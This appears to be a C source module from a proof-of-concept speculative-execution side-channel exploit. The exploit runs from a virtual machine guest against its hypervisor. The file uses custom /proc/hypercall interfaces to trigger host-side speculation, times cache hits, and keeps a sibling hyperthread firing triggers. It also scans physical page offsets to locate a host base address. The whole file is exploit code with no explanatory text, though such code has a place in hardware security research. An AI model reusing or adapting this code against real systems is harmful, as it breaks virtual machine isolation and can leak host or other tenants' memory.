#define _GNU_SOURCE
#include <err.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <assert.h>
#include <pthread.h>
#include "constants.h"
#include "helpers.h"
#include "spectre.h"
#include "timing.h"
#include "util.h"

pthread_t sibling = -1;
int sibling_stop = 0;

static int do_half_spectre(void *buf, const size_t idx, const size_t iters) {
	static int hlt_cnt = 1;
	static int fdhalt = -1;
	if (fdhalt == -1) {
		fdhalt = open("/proc/hypercall/halt", O_WRONLY);
		assert(fdhalt > 0);
	}

	static int fd_sched_yield = -1;
	if (fd_sched_yield == -1) {
		fd_sched_yield = open ("/proc/hypercall/sched_yield", O_WRONLY);
		assert(fd_sched_yield > 0);
	}

	static struct sched_yield_hypercall yield_opts = {
		.current_cpu_id = -1,
		.speculated_cpu_id = -1,
		.ptr = NULL
	};
	if (yield_opts.current_cpu_id == -1ULL) {
		unsigned int cpu = 0;
		if (getcpu(&cpu, NULL) == -1) {
			err(EXIT_FAILURE, "Failed to get CPU");
		}
		yield_opts.current_cpu_id = cpu;
	}

	yield_opts.speculated_cpu_id = idx;
	yield_opts.ptr = buf;

	int hits = 0;
	for (size_t i = 0; i < iters; ++i) {
		ssize_t time = write(fd_sched_yield, &yield_opts, sizeof(yield_opts));
		assert(time >= 0);
		if (time < CACHE_HIT_THRESHOLD) {
			hits++;
		}
	}
	hlt_cnt -= iters;
	if (hlt_cnt <= 0) {
		hlt_cnt = 1100;
		for (int r = 0; r < 2; r++)
			assert(write(fdhalt, NULL, 0) == 0);
	}

	return hits;
}

void test_half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
{
	for (int delta_p = 0; delta_p <= 0x200; delta_p += 0x200) {
		for (int delta_off = 0; delta_off <= 0x200; delta_off += 0x200) {
			uint64_t off = pa_p - pa_base + delta_off;
			printf("half_spectre | pa_base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", pa_base, pa_p+delta_p, off, off/8);
			printf("| hits = %d / 1M\n", do_half_spectre(p + delta_p, off/8, 1000000));
		}
	}
}

uintptr_t spectre_find_base(char *p, uintptr_t pa_p)
{
	const int verbose = 2;
#if DEBUG
	if (verbose >= 1) printf("spectre_find_base:     real base = %10lx\n", helper_base_pa());
	if (verbose >= 1) printf("spectre_find_base:   correct off = %10lx\n", pa_p-helper_base_pa());
#endif

	for (int run = 0; run < 1000; run++) {
		if (verbose >= 2) {
			printf("l1tf_find_page_pa: run %3d", run);
			fflush(stdout);
			printf("\33[2K\r");
		}
		// uintptr_t start = 0x1000-0x218; uintptr_t end = pa_p;
		uintptr_t real_off = pa_p-helper_base_pa(); uintptr_t start = real_off - 1000*PAGE_SIZE; uintptr_t end = real_off + 10*PAGE_SIZE;
		for (uintptr_t off = start; off < end; off += PAGE_SIZE) {
			int hits = do_half_spectre(p, off/8, 10000);
			if (!hits)
				continue;
			printf("spectre_find_base: candidate off = %10lx\n", off);
			test_half_spectre((uint8_t *)p, pa_p, pa_p-off);
		}
	}
	return -1;
}

static void do_spectre_touch_base(int repeat) {
	static int halt_counter = 1;
	static int fd_halt = -1;
	if (fd_halt == -1) {
		fd_halt = open("/proc/hypercall/halt", O_WRONLY);
		assert(fd_halt > 0);
	}
	static struct self_send_ipi_hypercall opts = {.min = 0, .repeat = 1};
	static int fd = -1;
	if (fd == -1) {
		fd = open("/proc/hypercall/self_send_ipi", O_WRONLY);
		assert(fd > 0);
	}

	opts.repeat = repeat;
	assert(write(fd, &opts, sizeof(opts)) != 1);

	halt_counter -= repeat;
	if (halt_counter <= 0) {
		halt_counter = 1100;
		for (int r = 0; r < 2; r++)
			assert(write(fd_halt, NULL, 0) == 0);
	}
}

static void *spectre_touch_base(void *data)
{
	const int verbose = 0;
	set_cpu_affinity(get_sibling(CPU));
	if (verbose >= 1) printf("[sibling] starting spectre_touch_base\n");
	static int triggers = 0;
	uint64_t start = clock_read();
	while (!sibling_stop) {
		do_spectre_touch_base(100);
		triggers += 100;
		if (verbose >= 2) if (triggers % 10000 == 0) {
			double duration = (clock_read() - start) / 1000000000.0;
			printf("[sibling] spectre_touch_base: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
			fflush(stdout);
			printf("\33[2K\r");
		}
	}
	if (verbose >= 1) printf("[sibling] exiting spectre_touch_base\n");
	return NULL;
}

void spectre_touch_base_start(void)
{
	if (sibling == -1LU) {
		sibling_stop = 0;
		assert(pthread_create(&sibling, NULL, spectre_touch_base, NULL) == 0);
	}
	else
		printf("WARNING: spectre_touch_base_start while sibling is already busy\n");
}

void spectre_touch_base_stop(void)
{
	sibling_stop = 1;
	assert(pthread_join(sibling, NULL) == 0);
	sibling = -1;
}

static void *half_spectre(void *data)
{
	const int verbose = 1;
	uint64_t idx = (uint64_t)data;
	set_cpu_affinity(get_sibling(CPU));
	if (verbose >= 1) printf("[sibling] starting half_spectre with idx = %lx\n", idx);
	static int triggers = 0;
	uint64_t start = clock_read();
	while (!sibling_stop) {
		do_half_spectre(&idx, idx, 100);
		triggers += 100;
		if (verbose >= 2) if (triggers % 10000 == 0) {
			double duration = (clock_read() - start) / 1000000000.0;
			printf("[sibling] half_spectre: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
			fflush(stdout);
			printf("\33[2K\r");
		}
	}
	if (verbose >= 1) printf("[sibling] exiting half_spectre\n");
	return NULL;
}

void half_spectre_start(uintptr_t base, uintptr_t pa)
{
	uint64_t idx = (pa - base) / 8;
	if (sibling == -1LU) {
		sibling_stop = 0;
		assert(pthread_create(&sibling, NULL, half_spectre, (void *)idx) == 0);
	}
	else
		printf("WARNING: half_spectre_start while sibling is already busy\n");
}

void half_spectre_stop(void)
{
	sibling_stop = 1;
	assert(pthread_join(sibling, NULL) == 0);
	sibling = -1;
}
